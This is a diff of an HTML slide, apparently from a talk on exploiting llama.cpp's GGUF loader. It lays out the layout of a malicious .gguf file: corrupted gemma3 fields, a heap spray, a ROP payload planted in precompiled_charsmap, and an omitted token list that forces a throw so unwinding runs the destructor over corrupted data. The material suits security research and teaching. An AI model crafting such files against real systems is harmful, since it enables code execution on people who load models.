@@ -1,24 +1,45 @@
-<section>
-  <h2 class="section-title">Plant the payload, then force a throw</h2>
-  <div class="card card-red full-width">
-    <div class="card-header">src/llama-vocab.cpp &mdash; impl::load (excerpt)</div>
-    <pre><code class="language-cpp">} else if (tokenizer_model == "t5") {                       // tokenizer.ggml.model = "t5"
-  type = LLAMA_VOCAB_TYPE_UGM;
+<section class="dense">
+  <h2 class="section-title">Plant the blob, then force the throw</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header">src/llama-vocab.cpp &mdash; impl::load (excerpt)</div>
+        <pre><code class="language-cpp">} else if (tokenizer_model == "t5") {    // model = "t5"
+  // ... reads precompiled_charsmap as UINT8 ...
+  precompiled_charsmap.assign(pc, pc + n); // ◄ blob → heap
   // ...
-  const int kidx = gguf_find_key(ctx, kv(LLM_KV_TOKENIZER_PRECOMPILED_CHARSMAP).c_str());
-  if (kidx != -1) {
-    // ... reads it as a UINT8/INT8 array ...
-    const size_t n  = gguf_get_arr_n(ctx, kidx);
-    const char * pc = (const char *) gguf_get_arr_data(ctx, kidx);
-    precompiled_charsmap.assign(pc, pc + n);                // ◄ ROP blob materialised on the heap
-  }
-  // ...
-  const int token_idx = gguf_find_key(ctx, kv(LLM_KV_TOKENIZER_LIST).c_str());
-  if (token_idx == -1) {
-    throw std::runtime_error("cannot find tokenizer vocab in model file\n");  // ◄ forced abort, AFTER the plant
-  }</code></pre>
+  if (gguf_find_key(ctx, "…tokenizer.list") == -1)
+    throw std::runtime_error(
+      "cannot find tokenizer vocab");       // ◄ throw, AFTER
+}                                           //   the plant</code></pre>
+      </div>
+    </div>
+    <div class="col">
+      <div class="card card-blue">
+        <div class="card-header">the one malicious .gguf &mdash; now adding ③</div>
+        <pre><code class="language-text">① corrupt        (set earlier)
+   general.architecture = gemma3
+   gemma3.block_count   = 3852
+   …sliding_window=4096  …pattern=6
+② spray          (set earlier)
+   s.000000 … s.063999  = UINT8[65504]
+───────────────────────────────────  ◄ this slide
+③ payload + trigger
+   tokenizer.ggml.model = "t5"
+   tokenizer.ggml.precompiled_charsmap
+       = UINT8[ NULL · PIVOT · chain · cmd ]
+   tokenizer.ggml.tokens   ←  OMITTED</code></pre>
+      </div>
+    </div>
   </div>
-  <div class="textbox" style="margin-top: 18px;">
-    <p>Pick the <code>t5</code> tokenizer so the loader copies our <code>precompiled_charsmap</code> blob into the heap. Then <strong>omit <code>tokenizer.ggml.tokens</code></strong> &mdash; the loader throws right after the blob is planted. C++ stack unwinding now runs <code>~llama_model</code>, on an object whose fields we already corrupted.</p>
+  <div class="card card-red full-width steps">
+    <div class="card-header">what happens</div>
+    <ul class="card-list">
+      <li><code>tokenizer.ggml.model = "t5"</code> &rarr; the loader takes the <strong>t5 / UGM</strong> branch.</li>
+      <li>that branch <strong>copies our <code>precompiled_charsmap</code> blob onto the heap</strong> &mdash; <em>before</em> it checks the token list. The payload is planted.</li>
+      <li><span class="inline-tag tag-purple">why this array, not a spray KV</span> the spray&apos;s <code>s.*</code> <code>UINT8</code> arrays only <strong>blanket</strong> the fixed address <code>0x100000001</code>; <code>precompiled_charsmap</code> is the one array the loader <strong>copies into its own fresh heap buffer</strong> (the <code>assign</code> above) &mdash; a single contiguous blob the unwinding lands in. The ROP <em>has</em> to live here.</li>
+      <li>we <strong>omit <code>tokenizer.ggml.tokens</code></strong>, so the next check fails and the loader <code>throw</code>s right after.</li>
+      <li>the throw <strong>unwinds the stack</strong> &rarr; <code>~llama_model</code> runs &mdash; and walks our corrupted <strong><code>loras</code></strong> (next slide).</li>
+    </ul>
   </div>
 </section>
